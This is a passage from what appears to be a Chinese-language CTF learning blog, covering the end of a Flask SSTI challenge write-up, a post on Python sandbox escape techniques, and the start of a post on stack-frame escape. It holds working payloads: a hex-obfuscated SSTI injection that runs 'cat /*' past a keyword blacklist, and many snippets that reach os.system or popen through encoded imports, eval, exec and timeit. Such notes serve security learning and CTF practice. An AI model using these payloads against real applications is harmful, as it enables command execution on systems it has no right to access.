False,</span><br><span class="line">    &#x27;SESSION_COOKIE_SAMESITE&#x27;: None,</span><br><span class="line">    &#x27;SESSION_REFRESH_EACH_REQUEST&#x27;: True,</span><br><span class="line">    &#x27;MAX_CONTENT_LENGTH&#x27;: None,</span><br><span class="line">    &#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;: datetime.timedelta(seconds=43200),</span><br><span class="line">    &#x27;TRAP_BAD_REQUEST_ERRORS&#x27;: None,</span><br><span class="line">    &#x27;TRAP_HTTP_EXCEPTIONS&#x27;: False,</span><br><span class="line">    &#x27;EXPLAIN_TEMPLATE_LOADING&#x27;: False,</span><br><span class="line">    &#x27;PREFERRED_URL_SCHEME&#x27;: &#x27;http&#x27;,</span><br><span class="line">    &#x27;JSON_AS_ASCII&#x27;: True,</span><br><span class="line">    &#x27;JSON_SORT_KEYS&#x27;: True,</span><br><span class="line">    &#x27;JSONIFY_PRETTYPRINT_REGULAR&#x27;: False,</span><br><span class="line">    &#x27;JSONIFY_MIMETYPE&#x27;: &#x27;application/json&#x27;,</span><br><span class="line">    &#x27;TEMPLATES_AUTO_RELOAD&#x27;: None,</span><br><span class="line">    &#x27;MAX_COOKIE_SIZE&#x27;: 4093,</span><br><span class="line">    &#x27;BOOTSTRAP_USE_MINIFIED&#x27;: True,</span><br><span class="line">    &#x27;BOOTSTRAP_CDN_FORCE_SSL&#x27;: False,</span><br><span class="line">    &#x27;BOOTSTRAP_QUERYSTRING_REVVING&#x27;: True,</span><br><span class="line">    &#x27;BOOTSTRAP_SERVE_LOCAL&#x27;: False,</span><br><span class="line">    &#x27;BOOTSTRAP_LOCAL_SUBDOMAIN&#x27;: None</span><br><span class="line">&#125;&gt;</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸSSTI æ­£å¸¸æ‰“sstiå°±å¥½</p>
<p>é»‘åå• <code>[&#39;import&#39;,&#39;os&#39;,&#39;popen&#39;,&#39;eval&#39;,&#39;*&#39;,&#39;?&#39;]</code></p>
<p>payload:<code>&#123;&#123;((lipsum.__globals__.__builtins__['__i''mport__']('o''s'))['p''open']("\x63\x61\x74\x20\x2f\x2a")).read()&#125;&#125;</code></p>
<h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/05/12/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/2.png">
      <meta itemprop="name" content="Sauy">
      <meta itemprop="description" content="VENI,VEDI,VICI">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sauy's corner">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/05/12/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" class="post-title-link" itemprop="url">pythonæ²™ç®±é€ƒé€¸</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2025-05-12 13:50:58" itemprop="dateCreated datePublished" datetime="2025-05-12T13:50:58+08:00">2025-05-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2025-05-13 21:56:18" itemprop="dateModified" datetime="2025-05-13T21:56:18+08:00">2025-05-13</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><h2 id="Q1ï¼šä»€ä¹ˆæ˜¯æ²™ç®±ï¼Ÿ"><a href="#Q1ï¼šä»€ä¹ˆæ˜¯æ²™ç®±ï¼Ÿ" class="headerlink" title="Q1ï¼šä»€ä¹ˆæ˜¯æ²™ç®±ï¼Ÿ"></a>Q1ï¼šä»€ä¹ˆæ˜¯æ²™ç®±ï¼Ÿ</h2><p>æ²™ç®±æ˜¯ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œåœ¨é™åˆ¶çš„ç¯å¢ƒä¸­è¿è¡Œä¸å—ä¿¡ä»»çš„ä»£ç ã€‚pythonä¸­æ²™ç®±ä¸»è¦ç”¨äºé™åˆ¶pythonï¼Œé˜²æ­¢æ‰§è¡Œå‘½ä»¤æˆ–è€…è¿›è¡Œä¸€äº›å±é™©çš„è¡Œä¸ºã€‚</p>
<h2 id="Q2ï¼šä»€ä¹ˆæ˜¯æ²™ç®±ç»•è¿‡ï¼Ÿ"><a href="#Q2ï¼šä»€ä¹ˆæ˜¯æ²™ç®±ç»•è¿‡ï¼Ÿ" class="headerlink" title="Q2ï¼šä»€ä¹ˆæ˜¯æ²™ç®±ç»•è¿‡ï¼Ÿ"></a>Q2ï¼šä»€ä¹ˆæ˜¯æ²™ç®±ç»•è¿‡ï¼Ÿ</h2><p>å°±æ˜¯æ€ä¹ˆç»•è¿‡æ²™ç®±å¯¹æˆ‘ä»¬çš„é™åˆ¶ï¼Œæ‹¿åˆ°å±é™©å‡½æ•°ï¼Œæœ€ç»ˆæ¥æ‰§è¡Œå‘½ä»¤çš„è¿‡ç¨‹ã€‚</p>
<h2 id="ç›®çš„"><a href="#ç›®çš„" class="headerlink" title="ç›®çš„"></a>ç›®çš„</h2><p>å¯¹äºpythonæ²™ç®±ç»•è¿‡ï¼Œæˆ‘ä»¬æœ€ç»ˆå¯èƒ½è¦å®ç°çš„æƒ³æ³•æœ‰å¦‚ä¸‹:</p>
<p>Â·ç»•è¿‡é™åˆ¶ æ‰§è¡Œå‘½ä»¤</p>
<p>Â·å†™æ–‡ä»¶åˆ°æŒ‡å®šä½ç½®</p>
<h2 id="ç»•è¿‡æ–¹å¼"><a href="#ç»•è¿‡æ–¹å¼" class="headerlink" title="ç»•è¿‡æ–¹å¼"></a>ç»•è¿‡æ–¹å¼</h2><h4 id="importæ–¹å¼çš„ç»•è¿‡"><a href="#importæ–¹å¼çš„ç»•è¿‡" class="headerlink" title="importæ–¹å¼çš„ç»•è¿‡"></a>importæ–¹å¼çš„ç»•è¿‡</h4><ol>
<li><code>import xxx</code></li>
<li><code>from xxx import *</code></li>
<li><code>__import__(&#39;xxx&#39;)</code></li>
</ol>
<h4 id="ä½¿ç”¨å…¶ä»–çš„æ–¹å¼æ¥å¯¼å…¥åŒ…å"><a href="#ä½¿ç”¨å…¶ä»–çš„æ–¹å¼æ¥å¯¼å…¥åŒ…å" class="headerlink" title="ä½¿ç”¨å…¶ä»–çš„æ–¹å¼æ¥å¯¼å…¥åŒ…å"></a>ä½¿ç”¨å…¶ä»–çš„æ–¹å¼æ¥å¯¼å…¥åŒ…å</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).__dict__[<span class="string">&quot;system&quot;</span>](<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment">#python2 and python3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;&#x27;</span>.decode.(<span class="string">&#x27;base64&#x27;</span>)).getoutput(<span class="string">&#x27;pwd&#x27;</span>)</span><br><span class="line"><span class="comment">#python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">x = importlib.import_module(<span class="string">&#x27;pbzznaqf&#x27;</span>.encode(<span class="string">&#x27;rot_13&#x27;</span>)) <span class="comment">#commands</span></span><br><span class="line"><span class="built_in">print</span> (x.getoutput(<span class="string">&#x27;pwd&#x27;</span>))</span><br><span class="line"><span class="comment">#python2</span></span><br></pre></td></tr></table></figure>

<h4 id="æ¨¡å—è·¯å¾„æ–¹å¼çš„ç»•è¿‡"><a href="#æ¨¡å—è·¯å¾„æ–¹å¼çš„ç»•è¿‡" class="headerlink" title="æ¨¡å—è·¯å¾„æ–¹å¼çš„ç»•è¿‡"></a>æ¨¡å—è·¯å¾„æ–¹å¼çš„ç»•è¿‡</h4><p>pythonä¸­æ‰€æœ‰çš„åŒ…éƒ½æ˜¯ä»¥.pyæ–‡ä»¶å½¢å¼å­˜åœ¨çš„ï¼Œä½¿ç”¨æ‰€æœ‰çš„åŒ…éƒ½æ˜¯ç”±ç»å¯¹è·¯å¾„ï¼Œæˆ‘ä»¬å¯ä»¥æ˜¯ä½¿ç”¨è·¯å¾„æ¥è¾¾åˆ°å¼•å…¥åŒ…çš„ç›®çš„ã€‚</p>
<p>ä¸€èˆ¬å’Œç³»ç»Ÿç›¸å…³çš„ä¿¡æ¯éƒ½åœ¨sysä¸‹ï¼Œä½¿ç”¨sys.pathå¯ä»¥æŸ¥çœ‹åˆ°å„ä¸ªåŒ…çš„è·¯å¾„ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sys.path)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sysä¸‹è¿˜æœ‰ä¸€ä¸ªmodulesï¼Œè¿”å›ä¸€ä¸ªå­—å…¸ï¼Œå¯ä»¥æŸ¥çœ‹å„ä¸ªæ¨¡å—å¯¹åº”çš„ç³»ç»Ÿè·¯å¾„ã€‚</span></span><br><span class="line"><span class="built_in">print</span>(sys.modules[<span class="string">&#x27;os&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#python2 and python3</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœæŠŠsysã€osã€reloadä¸€ç³»åˆ—æ¨¡å—ç¦æ­¢äº†ï¼Œä½¿ç”¨æ¨¡å—å¯¹åº”è·¯å¾„æ¥å¯¼å…¥æ¨¡å— å‰ææ˜¯å¿…é¡»çŸ¥é“ç»å¯¹è·¯å¾„ ä¸€èˆ¬æ˜¯é»˜è®¤è·¯å¾„ä¸ä¼šæ”¹å˜</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execfile(<span class="string">&#x27;/usr/lib/python.2.7/os.py&#x27;</span>)</span><br><span class="line"><span class="comment">#python2</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/usr/lib/python3.6/os.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f: <span class="comment">#è·¯å¾„é€šè¿‡ä¸Šé¢çš„sysæ–¹æ³•æ¥æ‰¾</span></span><br><span class="line">    <span class="built_in">exec</span>(f.read())</span><br><span class="line">system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment">#python2 and python3</span></span><br></pre></td></tr></table></figure>

<h4 id="timieit"><a href="#timieit" class="headerlink" title="timieit"></a>timieit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;</span>,number=<span class="number">1</span>)</span><br><span class="line"><span class="comment">#p2 and p3</span></span><br></pre></td></tr></table></figure>

<h4 id="builtinså‡½æ•°"><a href="#builtinså‡½æ•°" class="headerlink" title="builtinså‡½æ•°"></a>builtinså‡½æ•°</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(__builtins__)</span><br><span class="line">[<span class="string">&#x27;ArithmeticError&#x27;</span>, <span class="string">&#x27;AssertionError&#x27;</span>, <span class="string">&#x27;AttributeError&#x27;</span>, <span class="string">&#x27;BaseException&#x27;</span>, <span class="string">&#x27;BaseExceptionGroup&#x27;</span>, <span class="string">&#x27;BlockingIOError&#x27;</span>, <span class="string">&#x27;BrokenPipeError&#x27;</span>, <span class="string">&#x27;BufferError&#x27;</span>, <span class="string">&#x27;BytesWarning&#x27;</span>, <span class="string">&#x27;ChildProcessError&#x27;</span>, <span class="string">&#x27;ConnectionAbortedError&#x27;</span>, <span class="string">&#x27;ConnectionError&#x27;</span>, <span class="string">&#x27;ConnectionRefusedError&#x27;</span>, <span class="string">&#x27;ConnectionResetError&#x27;</span>, <span class="string">&#x27;DeprecationWarning&#x27;</span>, <span class="string">&#x27;EOFError&#x27;</span>, <span class="string">&#x27;Ellipsis&#x27;</span>, <span class="string">&#x27;EncodingWarning&#x27;</span>, <span class="string">&#x27;EnvironmentError&#x27;</span>, <span class="string">&#x27;Exception&#x27;</span>, <span class="string">&#x27;ExceptionGroup&#x27;</span>, <span class="string">&#x27;False&#x27;</span>, <span class="string">&#x27;FileExistsError&#x27;</span>, <span class="string">&#x27;FileNotFoundError&#x27;</span>, <span class="string">&#x27;FloatingPointError&#x27;</span>, <span class="string">&#x27;FutureWarning&#x27;</span>, <span class="string">&#x27;GeneratorExit&#x27;</span>, <span class="string">&#x27;IOError&#x27;</span>, <span class="string">&#x27;ImportError&#x27;</span>, <span class="string">&#x27;ImportWarning&#x27;</span>, <span class="string">&#x27;IndentationError&#x27;</span>, <span class="string">&#x27;IndexError&#x27;</span>, <span class="string">&#x27;InterruptedError&#x27;</span>, <span class="string">&#x27;IsADirectoryError&#x27;</span>, <span class="string">&#x27;KeyError&#x27;</span>, <span class="string">&#x27;KeyboardInterrupt&#x27;</span>, <span class="string">&#x27;LookupError&#x27;</span>, <span class="string">&#x27;MemoryError&#x27;</span>, <span class="string">&#x27;ModuleNotFoundError&#x27;</span>, <span class="string">&#x27;NameError&#x27;</span>, <span class="string">&#x27;None&#x27;</span>, <span class="string">&#x27;NotADirectoryError&#x27;</span>, <span class="string">&#x27;NotImplemented&#x27;</span>, <span class="string">&#x27;NotImplementedError&#x27;</span>, <span class="string">&#x27;OSError&#x27;</span>, <span class="string">&#x27;OverflowError&#x27;</span>, <span class="string">&#x27;PendingDeprecationWarning&#x27;</span>, <span class="string">&#x27;PermissionError&#x27;</span>, <span class="string">&#x27;ProcessLookupError&#x27;</span>, <span class="string">&#x27;RecursionError&#x27;</span>, <span class="string">&#x27;ReferenceError&#x27;</span>, <span class="string">&#x27;ResourceWarning&#x27;</span>, <span class="string">&#x27;RuntimeError&#x27;</span>, <span class="string">&#x27;RuntimeWarning&#x27;</span>, <span class="string">&#x27;StopAsyncIteration&#x27;</span>, <span class="string">&#x27;StopIteration&#x27;</span>, <span class="string">&#x27;SyntaxError&#x27;</span>, <span class="string">&#x27;SyntaxWarning&#x27;</span>, <span class="string">&#x27;SystemError&#x27;</span>, <span class="string">&#x27;SystemExit&#x27;</span>, <span class="string">&#x27;TabError&#x27;</span>, <span class="string">&#x27;TimeoutError&#x27;</span>, <span class="string">&#x27;True&#x27;</span>, <span class="string">&#x27;TypeError&#x27;</span>, <span class="string">&#x27;UnboundLocalError&#x27;</span>, <span class="string">&#x27;UnicodeDecodeError&#x27;</span>, <span class="string">&#x27;UnicodeEncodeError&#x27;</span>, <span class="string">&#x27;UnicodeError&#x27;</span>, <span class="string">&#x27;UnicodeTranslateError&#x27;</span>, <span class="string">&#x27;UnicodeWarning&#x27;</span>, <span class="string">&#x27;UserWarning&#x27;</span>, <span class="string">&#x27;ValueError&#x27;</span>, <span class="string">&#x27;Warning&#x27;</span>, <span class="string">&#x27;WindowsError&#x27;</span>, <span class="string">&#x27;ZeroDivisionError&#x27;</span>, <span class="string">&#x27;__build_class__&#x27;</span>, <span class="string">&#x27;__debug__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;aiter&#x27;</span>, <span class="string">&#x27;all&#x27;</span>, <span class="string">&#x27;anext&#x27;</span>, <span class="string">&#x27;any&#x27;</span>, <span class="string">&#x27;ascii&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;bool&#x27;</span>, <span class="string">&#x27;breakpoint&#x27;</span>, <span class="string">&#x27;bytearray&#x27;</span>, <span class="string">&#x27;bytes&#x27;</span>, <span class="string">&#x27;callable&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;classmethod&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;complex&#x27;</span>, <span class="string">&#x27;copyright&#x27;</span>, <span class="string">&#x27;credits&#x27;</span>, <span class="string">&#x27;delattr&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;divmod&#x27;</span>, <span class="string">&#x27;enumerate&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;float&#x27;</span>, <span class="string">&#x27;format&#x27;</span>, <span class="string">&#x27;frozenset&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;hasattr&#x27;</span>, <span class="string">&#x27;hash&#x27;</span>, <span class="string">&#x27;help&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>, <span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;isinstance&#x27;</span>, <span class="string">&#x27;issubclass&#x27;</span>, <span class="string">&#x27;iter&#x27;</span>, <span class="string">&#x27;len&#x27;</span>, <span class="string">&#x27;license&#x27;</span>, <span class="string">&#x27;list&#x27;</span>, <span class="string">&#x27;locals&#x27;</span>, <span class="string">&#x27;map&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;memoryview&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;next&#x27;</span>, <span class="string">&#x27;object&#x27;</span>, <span class="string">&#x27;oct&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;property&#x27;</span>, <span class="string">&#x27;quit&#x27;</span>, <span class="string">&#x27;range&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;reversed&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;setattr&#x27;</span>, <span class="string">&#x27;slice&#x27;</span>, <span class="string">&#x27;sorted&#x27;</span>, <span class="string">&#x27;staticmethod&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;sum&#x27;</span>, <span class="string">&#x27;super&#x27;</span>, <span class="string">&#x27;tuple&#x27;</span>, <span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;vars&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)](<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).system(<span class="string">&#x27;whoami&#x27;</span>)<span class="comment">#ä½†æ˜¯è¿™ä¸ªåªèƒ½python2ä½¿ç”¨</span></span><br><span class="line"><span class="comment">#==</span></span><br><span class="line">__builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)<span class="comment">#p2 and p3</span></span><br></pre></td></tr></table></figure>

<h4 id="exec-and-eval"><a href="#exec-and-eval" class="headerlink" title="exec and eval"></a>exec and eval</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;</span>)</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;cat flag&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="platform"><a href="#platform" class="headerlink" title="platform"></a>platform</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="built_in">print</span> (platform.popen(<span class="string">&#x27;dir&#x27;</span>).read())</span><br><span class="line"><span class="comment">#python2</span></span><br></pre></td></tr></table></figure>

<h4 id="dir-å’Œ-dict"><a href="#dir-å’Œ-dict" class="headerlink" title="dir å’Œ __dict__"></a><code>dir </code>å’Œ <code>__dict__</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.a = <span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">dir</span>(A))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (A.__dict__)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">dir</span>(sys.modules[__name__]))</span><br></pre></td></tr></table></figure>

<h4 id="func-code"><a href="#func-code" class="headerlink" title="func_code"></a>func_code</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x,y,z</span>):</span><br><span class="line">    a = <span class="string">&#x27;secret&#x27;</span></span><br><span class="line">    b = <span class="number">2333</span></span><br><span class="line"><span class="built_in">print</span> (f.func_code.co_argcount)</span><br><span class="line"><span class="built_in">print</span> (f.func_code.co_consts)</span><br><span class="line"><span class="built_in">print</span> (f.func_code.co_code)</span><br><span class="line"><span class="comment">#p2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x,y,z</span>):</span><br><span class="line">    a = <span class="string">&#x27;secret&#x27;</span></span><br><span class="line">    b = <span class="number">2333</span></span><br><span class="line"><span class="built_in">print</span>(f.__code__.co_argcount)</span><br><span class="line"><span class="built_in">print</span>(f.__code__.co_consts)</span><br><span class="line"><span class="built_in">print</span>(f.__code__.co_code)</span><br><span class="line"><span class="comment">#p3</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x,y,z</span>):</span><br><span class="line">    a = <span class="string">&#x27;secret&#x27;</span></span><br><span class="line">    b = <span class="number">2333</span></span><br><span class="line"><span class="built_in">print</span> (dis.dis(f))</span><br></pre></td></tr></table></figure>

<h4 id="objectç±»åŸºç¡€å‡½æ•°"><a href="#objectç±»åŸºç¡€å‡½æ•°" class="headerlink" title="objectç±»åŸºç¡€å‡½æ•°"></a>objectç±»åŸºç¡€å‡½æ•°</h4><p>å…¶å®å°±æ˜¯SSTI è¿™é‡Œä¸å¤šå†™</p>
<h4 id="èŠ±å¼å¤„ç†å­—ç¬¦ä¸²"><a href="#èŠ±å¼å¤„ç†å­—ç¬¦ä¸²" class="headerlink" title="èŠ±å¼å¤„ç†å­—ç¬¦ä¸²"></a>èŠ±å¼å¤„ç†å­—ç¬¦ä¸²</h4><h5 id="ç¼–ç "><a href="#ç¼–ç " class="headerlink" title="ç¼–ç "></a>ç¼–ç </h5><p>open(chr(102)+chr(108)+chr(97)+chr(103)).read()</p>
<p><code>__builtins__.__dict__[&#39;__import__&#39;](&#39;os&#39;).system(&#39;whoami&#39;)#p2 and p</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__loader__,__import__,compile,eval,exec,chr,input,locals,globals and `,&quot;,&#x27; </span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/05/11/%E5%88%9D%E5%AD%A6%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/2.png">
      <meta itemprop="name" content="Sauy">
      <meta itemprop="description" content="VENI,VEDI,VICI">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sauy's corner">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/05/11/%E5%88%9D%E5%AD%A6%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/" class="post-title-link" itemprop="url">æ ˆå¸§é€ƒé€¸</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2025-05-11 14:50:58" itemprop="dateCreated datePublished" datetime="2025-05-11T14:50:58+08:00">2025-05-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2025-05-19 20:49:03" itemprop="dateModified" datetime="2025-05-19T20:49:03+08:00">2025-05-19</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="åˆå­¦æ ˆå¸§é€ƒé€¸"><a href="#åˆå­¦æ ˆå¸§é€ƒé€¸" class="headerlink" title="åˆå­¦æ ˆå¸§é€ƒé€¸"></a>åˆå­¦æ ˆå¸§é€ƒé€¸</h1><h2 id="æ ˆå¸§ä»‹ç»"><a href="#æ ˆå¸§ä»‹ç»" class="headerlink" title="æ ˆå¸§ä»‹ç»"></a>æ ˆå¸§ä»‹ç»</h2><p>åœ¨ Python ä¸­ï¼Œ<strong>æ ˆå¸§ï¼ˆStack Frameï¼‰</strong> æ˜¯å‡½æ•°è°ƒç”¨æ—¶åœ¨å†…å­˜ä¸­åˆ†é…çš„ä¸€ä¸ªæ•°æ®ç»“æ„ï¼Œç”¨äºå­˜å‚¨å‡½æ•°çš„è¿è¡Œä¿¡æ¯ï¼ˆå¦‚å±€éƒ¨å˜é‡ã€å‚æ•°ã€è¿”å›åœ°å€ç­‰ï¼‰ã€‚å®ƒæ˜¯ Python è§£é‡Šå™¨ç®¡ç†å‡½æ•°è°ƒç”¨å’Œæ‰§è¡Œæµç¨‹çš„æ ¸å¿ƒæœºåˆ¶ä¹‹ä¸€ï¼Œå°¤å…¶åœ¨é€’å½’ã€å¼‚å¸¸å¤„ç†å’Œè°ƒè¯•æ—¶éå¸¸é‡è¦ã€‚</p>
